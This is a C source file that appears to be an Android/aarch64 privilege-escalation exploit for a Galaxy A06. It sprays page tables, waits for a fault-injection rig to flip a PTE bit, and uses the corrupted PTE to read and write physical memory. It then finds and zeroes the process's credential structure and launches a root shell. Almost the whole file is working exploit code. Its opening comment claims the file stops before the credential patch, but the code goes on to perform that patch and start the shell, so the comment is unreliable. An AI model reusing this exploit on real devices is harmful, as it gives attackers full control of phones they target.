/*

Android/aarch64 port of linux_x86_64_lpe.c — Galaxy A06 (MT6768, MediaTek Helio G85).

Same idea as the x86_64 version: spray a huge tower of pagetables via a
memfd-backed shared mapping, wait for the EMFI rig to flip a bit during a
PTE walk, then use the resulting hijacked PTE as an arbitrary physmem r/w
primitive.

This file stops at the physmem-scan step so we can validate the primitive
without doing the actual su patch yet.

Built freestanding with linux_syscall_support.h — no libc.

*/

#define SYS_INLINE_SYSCALL 1
static int my_errno;
#define SYS_ERRNO my_errno
#include "linux_syscall_support.h"

typedef unsigned long      uint64_t;
typedef long               int64_t;
typedef unsigned int       uint32_t;
typedef unsigned char      uint8_t;
typedef unsigned long      uintptr_t;
typedef unsigned long      size_t;
typedef long               ssize_t;
typedef long               off_t;
typedef long               intptr_t;

#define PROT_READ              0x1
#define PROT_WRITE             0x2
#define MAP_SHARED             0x01
#define MAP_FIXED_NOREPLACE 0x100000
#define MAP_FAILED          ((void *)-1)
#define MFD_CLOEXEC          0x0001
#define SEEK_SET                  0

#define STDOUT 1
#define STDERR 2

#define __NR_memfd_create 279

/* ---------- Galaxy A06 specifics ----------
   MT6768 device tree: memory { reg = <0 0x40000000 0 ...>; }
   So DRAM physical base is 0x40000000. Device has ~4 GiB.

   Android arm64 here uses 39-bit user VA (max 0x8000000000 = 512 GiB).
   Theoretical pagetable spray cap on 39-bit VA: ~1 GiB of L3 PT pages
   (each 4K PT covers 2 MiB of virtual; 512 GiB / 2 MiB * 4K = ~1 GiB).
   We spray up to ~480 GiB virtual → ~960 MiB of L3 pagetables, leaving
   ~32 GiB of VA headroom for the stack at the top of user space.
*/
#define TWO_MB         0x200000UL
#define MEMFD_SIZE     (TWO_MB * 16)            /* 32 MiB */
#define PT_SPRAY_COUNT 0x3c00UL                 /* 15360 → 480 GiB virtual → ~960 MiB PTs */
#define TLB_FLUSH_ITERS 2048                    /* must be <= PT_SPRAY_COUNT */
#define SPRAY_BASE     0x100000000UL            /* 4 GiB, 2 MiB-aligned; spray ends at ~472 GiB */
#define PHYS_MEM_BASE  0x40000000UL             /* MT6768 DRAM base */
#define PHYS_MEM_END   0x140000000UL            /* +4 GiB; A06 has ~3.6 GiB usable */

/* ---------- syscall + io helpers ---------- */

static int sys_memfd_create(const char *name, unsigned int flags) {
    register long x8 __asm__("x8") = __NR_memfd_create;
    register long x0 __asm__("x0") = (long)(uintptr_t)name;
    register long x1 __asm__("x1") = (long)flags;
    __asm__ volatile("svc #0"
                     : "+r"(x0)
                     : "r"(x8), "r"(x1)
                     : "memory", "cc");
    return (int)x0;
}

static size_t str_len(const char *s) {
    size_t n = 0;
    while (s[n]) n++;
    return n;
}

static void p_str(const char *s) {
    sys_write(STDOUT, s, str_len(s));
}

static void p_hex(uint64_t v, int digits) {
    char buf[16];
    static const char hex[] = "0123456789abcdef";
    for (int i = digits - 1; i >= 0; i--) {
        buf[i] = hex[v & 0xf];
        v >>= 4;
    }
    sys_write(STDOUT, buf, digits);
}

static void p_hex64(uint64_t v) { p_str("0x"); p_hex(v, 16); }
static void p_nl(void)          { p_str("\n"); }

static void p_dec(uint64_t v, int digits) {
    char buf[20];
    for (int i = digits - 1; i >= 0; i--) {
        buf[i] = '0' + (v % 10);
        v /= 10;
    }
    sys_write(STDOUT, buf, digits);
}

static void die(const char *msg) {
    sys_write(STDERR, msg, str_len(msg));
    sys_write(STDERR, " errno=", 7);
    {
        char buf[8];
        static const char hex[] = "0123456789abcdef";
        uint32_t e = (uint32_t)my_errno;
        for (int i = 7; i >= 0; i--) { buf[i] = hex[e & 0xf]; e >>= 4; }
        sys_write(STDERR, buf, 8);
    }
    sys_write(STDERR, "\n", 1);
    sys_exit_group(1);
    __builtin_unreachable();
}

/* ---------- exploit ---------- */

static volatile uint64_t * volatile glitched_pte = NULL;

static uint64_t *find_glitched_pte(void) {
    p_str("[*] Searching for bitflipped PTEs\n");
    /* this is when the EMFI rig should start firing */
    for (;;) {
        sys_write(STDOUT, ".", 1);
        for (size_t i = 0; i < PT_SPRAY_COUNT; i++) {
            for (size_t j = 0; j < MEMFD_SIZE; j += TWO_MB) {
                uint64_t *ptr = (uint64_t *)(SPRAY_BASE + i * MEMFD_SIZE + j);
                if (*ptr != 0x4141414141414141UL) {
                    p_str("\nFAULT!\n");
                    /* aarch64 leaf PTE: bit 0 valid, bit 1 page, bit 10 AF */
                    if ((*ptr & 0x403UL) != 0x403UL) {
                        continue;
                    }
                    /* sparse pagetable page heuristic: rest of the page zero */
                    int success = 1;
                    for (size_t k = 1; k < 0x1000 / 8; k++) {
                        if (ptr[k]) { success = 0; break; }
                    }
                    if (success) {
                        return ptr;
                    }
                }
            }
        }
    }
}

static void flush_tlb(void) {
    /* read from many distinct pages to evict our cached translation */
    for (size_t i = 0; i < TLB_FLUSH_ITERS; i++) {
        volatile uint64_t * volatile ptr = (uint64_t *)(SPRAY_BASE + i * MEMFD_SIZE);
        (void)*glitched_pte;   /* keep glitched_pte hot in the cache */
        (void)*ptr;
    }
}

/* aarch64 PTE: OA in bits[47:12]. Preserve everything else. */
#define PTE_OA_MASK    0x0000fffffffff000UL
#define PTE_ATTRS_MASK (~PTE_OA_MASK)

void _start(void) {
    p_str("[*] Setting up memfd\n");
    int memfd = sys_memfd_create("hax", MFD_CLOEXEC);
    if (memfd < 0) die("memfd_create failed");

    if (sys_ftruncate(memfd, MEMFD_SIZE) != 0) die("ftruncate failed");

    /* populate the memfd with recognizable values */
    for (size_t i = 0; i < MEMFD_SIZE; i += TWO_MB) {
        if (sys_lseek(memfd, (off_t)i, SEEK_SET) < 0) die("lseek failed");
        if (sys_write(memfd, "AAAAAAAA", 8) != 8) die("write failed");
    }

    p_str("[*] Spraying pagetables\n");
    for (size_t i = 0; i < PT_SPRAY_COUNT; i++) {
        uint8_t *want = (uint8_t *)(SPRAY_BASE + i * MEMFD_SIZE);
        uint8_t *got  = sys_mmap(want, MEMFD_SIZE,
                                 PROT_READ | PROT_WRITE,
                                 MAP_SHARED | MAP_FIXED_NOREPLACE,
                                 memfd, 0);
        if (got != want) {
            p_str("[-] spray mmap failed at i=");
            p_hex(i, 8);
            p_nl();
            die("mmap");
        }
    }

    /* on success, glitched_pte was glitched during a DRAM read.
       the actual PTE value in DRAM is unmodified.
       therefore it must not fall out of cache until the exploit is done.
       we'll re-read it periodically — volatile so the compiler doesn't elide. */
    glitched_pte = find_glitched_pte();
    p_str("[+] Found glitched PTE @ ");
    p_hex64((uint64_t)(uintptr_t)glitched_pte);
    p_nl();
    p_str("[*] PTE value: ");
    p_hex64(*glitched_pte);
    p_nl();
    p_str("[*] Searching for corresponding mapping...\n");

    uint64_t orig_pte = *glitched_pte;
    /* point the glitched PTE at PHYS_MEM_BASE so the corresponding mapping
       reads something other than 'AAAAAAAA' (DRAM start is unlikely to
       contain that pattern). preserve attribute bits. */
    *glitched_pte = (orig_pte & PTE_ATTRS_MASK) | (PHYS_MEM_BASE & PTE_OA_MASK);

    uint8_t *glitched_map = NULL;
    flush_tlb();

    for (size_t i = 0; i < PT_SPRAY_COUNT; i++) {
        for (size_t j = 0; j < MEMFD_SIZE; j += TWO_MB) {
            uint64_t *ptr = (uint64_t *)(SPRAY_BASE + i * MEMFD_SIZE + j);
            if (ptr == (uint64_t *)glitched_pte) continue;
            /* dual purpose: keep glitched_pte hot AND check we're not seeing
               the value we just wrote leak through the memfd path */
            if (*ptr == *glitched_pte) {
                p_str("[-] That's not supposed to happen\n");
                sys_exit_group(1);
                __builtin_unreachable();
            }
            if (*ptr != 0x4141414141414141UL) {
                p_str("Found it! @ ");
                p_hex64((uint64_t)(uintptr_t)ptr);
                p_nl();
                glitched_map = (uint8_t *)ptr;
            }
        }
    }

    if (!glitched_map) {
        p_str("[-] Failed to find corresponding mapping :(\n");
        sys_exit_group(1);
        __builtin_unreachable();
    }

    p_str("[+] Found the mapping @ ");
    p_hex64((uint64_t)(uintptr_t)glitched_map);
    p_nl();

    /* ----- LPE: layout-agnostic cred patch -----
       Snapshot our 8 cred id values, scan physmem for that 32-byte block
       (uid,gid,suid,sgid,euid,egid,fsuid,fsgid). On each candidate, write a
       sentinel sgid and call getresgid — if our own saved gid changes,
       we found our cred. Then zero the 32-byte block (uid=gid=...=0). */

    uint32_t ruid, euid_, suid_;
    uint32_t rgid, egid_, sgid_;
    sys_getresuid((uid_t *)&ruid, (uid_t *)&euid_, (uid_t *)&suid_);
    sys_getresgid((gid_t *)&rgid, (gid_t *)&egid_, (gid_t *)&sgid_);
    uint32_t fsuid_ = (uint32_t)sys_setfsuid((uid_t)-1);
    uint32_t fsgid_ = (uint32_t)sys_setfsgid((gid_t)-1);

    p_str("[*] my ids: ");
    p_str("ruid=");   p_hex(ruid,   8);
    p_str(" rgid=");  p_hex(rgid,   8);
    p_str(" suid=");  p_hex(suid_,  8);
    p_str(" sgid=");  p_hex(sgid_,  8);
    p_str(" euid=");  p_hex(euid_,  8);
    p_str(" egid=");  p_hex(egid_,  8);
    p_str(" fsuid="); p_hex(fsuid_, 8);
    p_str(" fsgid="); p_hex(fsgid_, 8);
    p_nl();

    /* The 8 expected values are kept as separate scalars so the compiler can
       hold them in registers — no contiguous 32-byte copy of the needle in
       our process memory for the sweep to false-positive on. */

    p_str("[*] Scanning physmem for our cred...\n");

    int found = 0;
    for (uintptr_t paddr = PHYS_MEM_BASE; paddr < PHYS_MEM_END && !found; paddr += 0x1000) {
        *glitched_pte = (orig_pte & PTE_ATTRS_MASK) | (paddr & PTE_OA_MASK);
        flush_tlb();

        if ((paddr & 0x3fffff) == 0) { /* every 4 MiB */
            uint64_t pct = (paddr - PHYS_MEM_BASE) * 100 / (PHYS_MEM_END - PHYS_MEM_BASE);
            p_str("\r[*] phys=");
            p_hex64(paddr);
            p_str(" (");
            p_dec(pct, 3);
            p_str("%)");
        }

        for (size_t off = 0; off + 32 <= 0x1000; off += 4) {
            volatile uint32_t *p = (volatile uint32_t *)(glitched_map + off);
            if (p[0] != ruid)   continue;
            if (p[1] != rgid)   continue;
            if (p[2] != suid_)  continue;
            if (p[3] != sgid_)  continue;
            if (p[4] != euid_)  continue;
            if (p[5] != egid_)  continue;
            if (p[6] != fsuid_) continue;
            if (p[7] != fsgid_) continue;

            /* candidate — write a sentinel sgid, ask the kernel what our
               saved gid is. if it agrees we just patched our own cred. */
            p[3] = 0x1337;
            __asm__ volatile("dmb ish" ::: "memory");

            uint32_t r2, e2, s2;
            sys_getresgid((gid_t *)&r2, (gid_t *)&e2, (gid_t *)&s2);

            if (s2 == 0x1337) {
                p_str("\n[+] our cred at PA=");
                p_hex64(paddr + off);
                p_nl();
                /* uid..fsgid all zero */
                for (int k = 0; k < 8; k++) p[k] = 0;
                __asm__ volatile("dmb ish" ::: "memory");
                found = 1;
                break;
            } else {
                /* not us — restore */
                p[3] = sgid_;
                __asm__ volatile("dmb ish" ::: "memory");
            }
        }
    }

    *glitched_pte = orig_pte;

    if (!found) {
        p_str("\n[-] couldn't find our cred\n");
        sys_exit_group(1);
        __builtin_unreachable();
    }

    p_str("[+] uid=0! exec'ing /system/bin/sh\n");
    const char *const argv[] = { "/system/bin/sh", 0 };
    const char *const envp[] = { 0 };
    sys_execve("/system/bin/sh", argv, envp);
    p_str("[-] execve failed\n");
    sys_exit_group(1);
    __builtin_unreachable();
}
